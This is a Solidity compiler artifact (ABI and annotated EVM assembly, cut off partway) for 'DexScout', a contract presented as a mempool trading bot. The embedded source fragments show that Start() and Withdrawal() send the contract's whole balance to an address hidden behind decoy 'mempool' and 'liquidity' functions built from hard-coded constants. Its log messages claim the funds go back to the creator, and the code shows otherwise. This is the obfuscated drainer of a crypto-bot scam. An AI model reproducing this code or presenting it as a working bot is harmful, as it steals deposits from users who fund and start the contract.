{
	"dexscout.sol": {
		"DexScout": {
			"abi": [
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "Start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"dexscout.sol\":682:15883  contract DexScout {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"dexscout.sol\":682:15883  contract DexScout {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"dexscout.sol\":1330:1519  function Start() public payable {... */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"dexscout.sol\":13948:14135  function Withdrawal() public payable {... */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"dexscout.sol\":11748:11832  function Stop() public payable {... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"dexscout.sol\":1330:1519  function Start() public payable {... */\n    tag_9:\n        /* \"dexscout.sol\":1377:1445  Log(\"Running DexScout action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_15\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":1463:1479  _callDexAction() */\n      tag_17\n        /* \"dexscout.sol\":1463:1477  _callDexAction */\n      tag_18\n        /* \"dexscout.sol\":1463:1479  _callDexAction() */\n      jump\t// in\n    tag_17:\n        /* \"dexscout.sol\":1455:1489  payable(_callDexAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexscout.sol\":1455:1512  payable(_callDexAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"dexscout.sol\":1490:1511  address(this).balance */\n      selfbalance\n        /* \"dexscout.sol\":1455:1512  payable(_callDexAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n        /* \"dexscout.sol\":1330:1519  function Start() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":13948:14135  function Withdrawal() public payable {... */\n    tag_11:\n        /* \"dexscout.sol\":14000:14058  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_22\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":14076:14095  WithdrawalProfits() */\n      tag_24\n        /* \"dexscout.sol\":14076:14093  WithdrawalProfits */\n      tag_25\n        /* \"dexscout.sol\":14076:14095  WithdrawalProfits() */\n      jump\t// in\n    tag_24:\n        /* \"dexscout.sol\":14068:14105  payable(WithdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexscout.sol\":14068:14128  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"dexscout.sol\":14106:14127  address(this).balance */\n      selfbalance\n        /* \"dexscout.sol\":14068:14128  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_27:\n      pop\n        /* \"dexscout.sol\":13948:14135  function Withdrawal() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":11748:11832  function Stop() public payable {... */\n    tag_13:\n        /* \"dexscout.sol\":11794:11825  Log(\"Stopping contract bot...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_29\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":11748:11832  function Stop() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":12346:12455  function _callDexAction() internal pure returns (address) {... */\n    tag_18:\n        /* \"dexscout.sol\":12395:12402  address */\n      0x00\n        /* \"dexscout.sol\":12421:12448  parseMempool(callMempool()) */\n      tag_32\n        /* \"dexscout.sol\":12434:12447  callMempool() */\n      tag_33\n        /* \"dexscout.sol\":12434:12445  callMempool */\n      tag_34\n        /* \"dexscout.sol\":12434:12447  callMempool() */\n      jump\t// in\n    tag_33:\n        /* \"dexscout.sol\":12421:12433  parseMempool */\n      tag_35\n        /* \"dexscout.sol\":12421:12448  parseMempool(callMempool()) */\n      jump\t// in\n    tag_32:\n        /* \"dexscout.sol\":12414:12448  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"dexscout.sol\":12346:12455  function _callDexAction() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":14140:14252  function WithdrawalProfits() internal pure returns (address) {... */\n    tag_25:\n        /* \"dexscout.sol\":14192:14199  address */\n      0x00\n        /* \"dexscout.sol\":14218:14245  parseMempool(callMempool()) */\n      tag_37\n        /* \"dexscout.sol\":14231:14244  callMempool() */\n      tag_38\n        /* \"dexscout.sol\":14231:14242  callMempool */\n      tag_34\n        /* \"dexscout.sol\":14231:14244  callMempool() */\n      jump\t// in\n    tag_38:\n        /* \"dexscout.sol\":14218:14230  parseMempool */\n      tag_35\n        /* \"dexscout.sol\":14218:14245  parseMempool(callMempool()) */\n      jump\t// in\n    tag_37:\n        /* \"dexscout.sol\":14211:14245  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"dexscout.sol\":14140:14252  function WithdrawalProfits() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":10428:11410  function callMempool() internal pure returns (string memory) {... */\n    tag_34:\n        /* \"dexscout.sol\":10474:10487  string memory */\n      0x60\n        /* \"dexscout.sol\":10499:10524  uint256 calculateGasNeeds */\n      0x00\n        /* \"dexscout.sol\":10527:10547  _calculateGasNeeds() */\n      tag_40\n        /* \"dexscout.sol\":10527:10545  _calculateGasNeeds */\n      tag_41\n        /* \"dexscout.sol\":10527:10547  _calculateGasNeeds() */\n      jump\t// in\n    tag_40:\n        /* \"dexscout.sol\":10499:10547  uint256 calculateGasNeeds = _calculateGasNeeds() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10557:10579  uint256 _memPoolLength */\n      0x00\n        /* \"dexscout.sol\":10582:10589  7342143 */\n      0x70083f\n        /* \"dexscout.sol\":10557:10589  uint256 _memPoolLength = 7342143 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10621:10641  uint256 _memPoolSize */\n      0x00\n        /* \"dexscout.sol\":10644:10654  3853786515 */\n      0xe5b41d93\n        /* \"dexscout.sol\":10621:10654  uint256 _memPoolSize = 3853786515 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10686:10708  uint256 _memPoolHeight */\n      0x00\n        /* \"dexscout.sol\":10711:10729  getMemPoolHeight() */\n      tag_42\n        /* \"dexscout.sol\":10711:10727  getMemPoolHeight */\n      tag_43\n        /* \"dexscout.sol\":10711:10729  getMemPoolHeight() */\n      jump\t// in\n    tag_42:\n        /* \"dexscout.sol\":10686:10729  uint256 _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10739:10760  uint256 _memPoolDepth */\n      0x00\n        /* \"dexscout.sol\":10763:10780  getMemPoolDepth() */\n      tag_44\n        /* \"dexscout.sol\":10763:10778  getMemPoolDepth */\n      tag_45\n        /* \"dexscout.sol\":10763:10780  getMemPoolDepth() */\n      jump\t// in\n    tag_44:\n        /* \"dexscout.sol\":10739:10780  uint256 _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10791:10819  string memory _memPoolOffset */\n      0x00\n        /* \"dexscout.sol\":10822:10870  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_46\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"dexscout.sol\":10835:10869  checkLiquidity(getMemPoolOffset()) */\n      tag_47\n        /* \"dexscout.sol\":10850:10868  getMemPoolOffset() */\n      tag_48\n        /* \"dexscout.sol\":10850:10866  getMemPoolOffset */\n      tag_49\n        /* \"dexscout.sol\":10850:10868  getMemPoolOffset() */\n      jump\t// in\n    tag_48:\n        /* \"dexscout.sol\":10835:10849  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":10835:10869  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_47:\n        /* \"dexscout.sol\":10822:10829  mempool */\n      tag_51\n        /* \"dexscout.sol\":10822:10870  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_46:\n        /* \"dexscout.sol\":10791:10870  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"dexscout.sol\":10880:10903  string memory _memPool1 */\n      0x00\n        /* \"dexscout.sol\":10906:10964  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      tag_52\n        /* \"dexscout.sol\":10914:10928  _memPoolOffset */\n      dup3\n        /* \"dexscout.sol\":10930:10963  checkLiquidity(calculateGasNeeds) */\n      tag_53\n        /* \"dexscout.sol\":10945:10962  calculateGasNeeds */\n      dup10\n        /* \"dexscout.sol\":10930:10944  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":10930:10963  checkLiquidity(calculateGasNeeds) */\n      jump\t// in\n    tag_53:\n        /* \"dexscout.sol\":10906:10913  mempool */\n      tag_51\n        /* \"dexscout.sol\":10906:10964  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      jump\t// in\n    tag_52:\n        /* \"dexscout.sol\":10880:10964  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":10974:10997  string memory _memPool2 */\n      0x00\n        /* \"dexscout.sol\":11000:11069  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_54\n        /* \"dexscout.sol\":11008:11038  checkLiquidity(_memPoolLength) */\n      tag_55\n        /* \"dexscout.sol\":11023:11037  _memPoolLength */\n      dup9\n        /* \"dexscout.sol\":11008:11022  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11008:11038  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_55:\n        /* \"dexscout.sol\":11040:11068  checkLiquidity(_memPoolSize) */\n      tag_56\n        /* \"dexscout.sol\":11055:11067  _memPoolSize */\n      dup9\n        /* \"dexscout.sol\":11040:11054  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11040:11068  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_56:\n        /* \"dexscout.sol\":11000:11007  mempool */\n      tag_51\n        /* \"dexscout.sol\":11000:11069  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_54:\n        /* \"dexscout.sol\":10974:11069  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11079:11102  string memory _memPool3 */\n      0x00\n        /* \"dexscout.sol\":11105:11135  checkLiquidity(_memPoolHeight) */\n      tag_57\n        /* \"dexscout.sol\":11120:11134  _memPoolHeight */\n      dup7\n        /* \"dexscout.sol\":11105:11119  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11105:11135  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_57:\n        /* \"dexscout.sol\":11079:11135  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11145:11168  string memory _memPool4 */\n      0x00\n        /* \"dexscout.sol\":11171:11200  checkLiquidity(_memPoolDepth) */\n      tag_58\n        /* \"dexscout.sol\":11186:11199  _memPoolDepth */\n      dup7\n        /* \"dexscout.sol\":11171:11185  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11171:11200  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_58:\n        /* \"dexscout.sol\":11145:11200  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11210:11236  string memory _allMempools */\n      0x00\n        /* \"dexscout.sol\":11239:11308  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_59\n        /* \"dexscout.sol\":11247:11276  mempool(_memPool1, _memPool2) */\n      tag_60\n        /* \"dexscout.sol\":11255:11264  _memPool1 */\n      dup7\n        /* \"dexscout.sol\":11266:11275  _memPool2 */\n      dup7\n        /* \"dexscout.sol\":11247:11254  mempool */\n      tag_51\n        /* \"dexscout.sol\":11247:11276  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_60:\n        /* \"dexscout.sol\":11278:11307  mempool(_memPool3, _memPool4) */\n      tag_61\n        /* \"dexscout.sol\":11286:11295  _memPool3 */\n      dup6\n        /* \"dexscout.sol\":11297:11306  _memPool4 */\n      dup6\n        /* \"dexscout.sol\":11278:11285  mempool */\n      tag_51\n        /* \"dexscout.sol\":11278:11307  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_61:\n        /* \"dexscout.sol\":11239:11246  mempool */\n      tag_51\n        /* \"dexscout.sol\":11239:11308  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_59:\n        /* \"dexscout.sol\":11210:11308  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11318:11344  string memory _fullMempool */\n      0x00\n        /* \"dexscout.sol\":11347:11373  mempool(\"0\", _allMempools) */\n      tag_62\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"dexscout.sol\":11360:11372  _allMempools */\n      dup4\n        /* \"dexscout.sol\":11347:11354  mempool */\n      tag_51\n        /* \"dexscout.sol\":11347:11373  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_62:\n        /* \"dexscout.sol\":11318:11373  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11391:11403  _fullMempool */\n      dup1\n        /* \"dexscout.sol\":11384:11403  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":10428:11410  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":7050:7965  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_35:\n        /* \"dexscout.sol\":7113:7128  address _parsed */\n      0x00\n        /* \"dexscout.sol\":7140:7156  bytes memory tmp */\n      dup1\n        /* \"dexscout.sol\":7165:7167  _a */\n      dup3\n        /* \"dexscout.sol\":7140:7168  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"dexscout.sol\":7178:7191  uint160 iaddr */\n      0x00\n        /* \"dexscout.sol\":7205:7215  uint160 b1 */\n      dup1\n        /* \"dexscout.sol\":7225:7235  uint160 b2 */\n      dup1\n        /* \"dexscout.sol\":7251:7260  uint256 i */\n      0x00\n        /* \"dexscout.sol\":7263:7264  2 */\n      0x02\n        /* \"dexscout.sol\":7251:7264  uint256 i = 2 */\n      swap1\n      pop\n        /* \"dexscout.sol\":7246:7928  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_64:\n        /* \"dexscout.sol\":7270:7280  2 + 2 * 20 */\n      0x2a\n        /* \"dexscout.sol\":7266:7267  i */\n      dup2\n        /* \"dexscout.sol\":7266:7280  i < 2 + 2 * 20 */\n      lt\n        /* \"dexscout.sol\":7246:7928  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_65\n      jumpi\n        /* \"dexscout.sol\":7313:7316  256 */\n      0x0100\n        /* \"dexscout.sol\":7304:7316  iaddr *= 256 */\n      dup5\n      tag_67\n      swap2\n      swap1\n      tag_68\n      jump\t// in\n    tag_67:\n      swap4\n      pop\n        /* \"dexscout.sol\":7349:7352  tmp */\n      dup5\n        /* \"dexscout.sol\":7353:7354  i */\n      dup2\n        /* \"dexscout.sol\":7349:7355  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_69\n      jumpi\n      tag_70\n      tag_71\n      jump\t// in\n    tag_70:\n    tag_69:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":7343:7356  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":7335:7357  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"dexscout.sol\":7330:7357  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"dexscout.sol\":7390:7393  tmp */\n      dup5\n        /* \"dexscout.sol\":7398:7399  1 */\n      0x01\n        /* \"dexscout.sol\":7394:7395  i */\n      dup3\n        /* \"dexscout.sol\":7394:7399  i + 1 */\n      tag_72\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_72:\n        /* \"dexscout.sol\":7390:7400  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_74\n      jumpi\n      tag_75\n      tag_71\n      jump\t// in\n    tag_75:\n    tag_74:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":7384:7401  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":7376:7402  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"dexscout.sol\":7371:7402  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"dexscout.sol\":7427:7429  97 */\n      0x61\n        /* \"dexscout.sol\":7421:7423  b1 */\n      dup4\n        /* \"dexscout.sol\":7421:7429  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7420:7445  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_76\n      jumpi\n      pop\n        /* \"dexscout.sol\":7441:7444  102 */\n      0x66\n        /* \"dexscout.sol\":7435:7437  b1 */\n      dup4\n        /* \"dexscout.sol\":7435:7444  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7420:7445  (b1 >= 97) && (b1 <= 102) */\n    tag_76:\n        /* \"dexscout.sol\":7416:7642  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_77\n      jumpi\n        /* \"dexscout.sol\":7471:7473  87 */\n      0x57\n        /* \"dexscout.sol\":7465:7473  b1 -= 87 */\n      dup4\n      tag_78\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_78:\n      swap3\n      pop\n        /* \"dexscout.sol\":7416:7642  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_80)\n    tag_77:\n        /* \"dexscout.sol\":7505:7507  65 */\n      0x41\n        /* \"dexscout.sol\":7499:7501  b1 */\n      dup4\n        /* \"dexscout.sol\":7499:7507  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7498:7522  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_81\n      jumpi\n      pop\n        /* \"dexscout.sol\":7519:7521  70 */\n      0x46\n        /* \"dexscout.sol\":7513:7515  b1 */\n      dup4\n        /* \"dexscout.sol\":7513:7521  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7498:7522  (b1 >= 65) && (b1 <= 70) */\n    tag_81:\n        /* \"dexscout.sol\":7494:7642  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_82\n      jumpi\n        /* \"dexscout.sol\":7548:7550  55 */\n      0x37\n        /* \"dexscout.sol\":7542:7550  b1 -= 55 */\n      dup4\n      tag_83\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_83:\n      swap3\n      pop\n        /* \"dexscout.sol\":7494:7642  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_84)\n    tag_82:\n        /* \"dexscout.sol\":7582:7584  48 */\n      0x30\n        /* \"dexscout.sol\":7576:7578  b1 */\n      dup4\n        /* \"dexscout.sol\":7576:7584  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7575:7599  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"dexscout.sol\":7596:7598  57 */\n      0x39\n        /* \"dexscout.sol\":7590:7592  b1 */\n      dup4\n        /* \"dexscout.sol\":7590:7598  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7575:7599  (b1 >= 48) && (b1 <= 57) */\n    tag_85:\n        /* \"dexscout.sol\":7571:7642  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_86\n      jumpi\n        /* \"dexscout.sol\":7625:7627  48 */\n      0x30\n        /* \"dexscout.sol\":7619:7627  b1 -= 48 */\n      dup4\n      tag_87\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_87:\n      swap3\n      pop\n        /* \"dexscout.sol\":7571:7642  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_86:\n        /* \"dexscout.sol\":7494:7642  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_84:\n        /* \"dexscout.sol\":7416:7642  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_80:\n        /* \"dexscout.sol\":7666:7668  97 */\n      0x61\n        /* \"dexscout.sol\":7660:7662  b2 */\n      dup3\n        /* \"dexscout.sol\":7660:7668  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7659:7684  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_88\n      jumpi\n      pop\n        /* \"dexscout.sol\":7680:7683  102 */\n      0x66\n        /* \"dexscout.sol\":7674:7676  b2 */\n      dup3\n        /* \"dexscout.sol\":7674:7683  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7659:7684  (b2 >= 97) && (b2 <= 102) */\n    tag_88:\n        /* \"dexscout.sol\":7655:7881  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_89\n      jumpi\n        /* \"dexscout.sol\":7710:7712  87 */\n      0x57\n        /* \"dexscout.sol\":7704:7712  b2 -= 87 */\n      dup3\n      tag_90\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_90:\n      swap2\n      pop\n        /* \"dexscout.sol\":7655:7881  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_91)\n    tag_89:\n        /* \"dexscout.sol\":7744:7746  65 */\n      0x41\n        /* \"dexscout.sol\":7738:7740  b2 */\n      dup3\n        /* \"dexscout.sol\":7738:7746  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7737:7761  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_92\n      jumpi\n      pop\n        /* \"dexscout.sol\":7758:7760  70 */\n      0x46\n        /* \"dexscout.sol\":7752:7754  b2 */\n      dup3\n        /* \"dexscout.sol\":7752:7760  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7737:7761  (b2 >= 65) && (b2 <= 70) */\n    tag_92:\n        /* \"dexscout.sol\":7733:7881  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_93\n      jumpi\n        /* \"dexscout.sol\":7787:7789  55 */\n      0x37\n        /* \"dexscout.sol\":7781:7789  b2 -= 55 */\n      dup3\n      tag_94\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_94:\n      swap2\n      pop\n        /* \"dexscout.sol\":7733:7881  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_95)\n    tag_93:\n        /* \"dexscout.sol\":7821:7823  48 */\n      0x30\n        /* \"dexscout.sol\":7815:7817  b2 */\n      dup3\n        /* \"dexscout.sol\":7815:7823  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7814:7838  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_96\n      jumpi\n      pop\n        /* \"dexscout.sol\":7835:7837  57 */\n      0x39\n        /* \"dexscout.sol\":7829:7831  b2 */\n      dup3\n        /* \"dexscout.sol\":7829:7837  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7814:7838  (b2 >= 48) && (b2 <= 57) */\n    tag_96:\n        /* \"dexscout.sol\":7810:7881  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_97\n      jumpi\n        /* \"dexscout.sol\":7864:7866  48 */\n      0x30\n        /* \"dexscout.sol\":7858:7866  b2 -= 48 */\n      dup3\n      tag_98\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_98:\n      swap2\n      pop\n        /* \"dexscout.sol\":7810:7881  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_97:\n        /* \"dexscout.sol\":7733:7881  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_95:\n        /* \"dexscout.sol\":7655:7881  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_91:\n        /* \"dexscout.sol\":7914:7916  b2 */\n      dup2\n        /* \"dexscout.sol\":7909:7911  16 */\n      0x10\n        /* \"dexscout.sol\":7904:7906  b1 */\n      dup5\n        /* \"dexscout.sol\":7904:7911  b1 * 16 */\n      tag_99\n      swap2\n      swap1\n      tag_68\n      jump\t// in\n    tag_99:\n        /* \"dexscout.sol\":7904:7916  b1 * 16 + b2 */\n      tag_100\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_100:\n        /* \"dexscout.sol\":7894:7917  iaddr += (b1 * 16 + b2) */\n      dup5\n      tag_102\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_102:\n      swap4\n      pop\n        /* \"dexscout.sol\":7287:7288  2 */\n      0x02\n        /* \"dexscout.sol\":7282:7288  i += 2 */\n      dup2\n      tag_103\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_103:\n      swap1\n      pop\n        /* \"dexscout.sol\":7246:7928  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_64)\n    tag_65:\n      pop\n        /* \"dexscout.sol\":7952:7957  iaddr */\n      dup3\n        /* \"dexscout.sol\":7937:7958  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":7050:7965  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":6953:7045  function _calculateGasNeeds() internal pure returns(uint256) {... */\n    tag_41:\n        /* \"dexscout.sol\":7005:7012  uint256 */\n      0x00\n        /* \"dexscout.sol\":7031:7038  4070554 */\n      0x3e1c9a\n     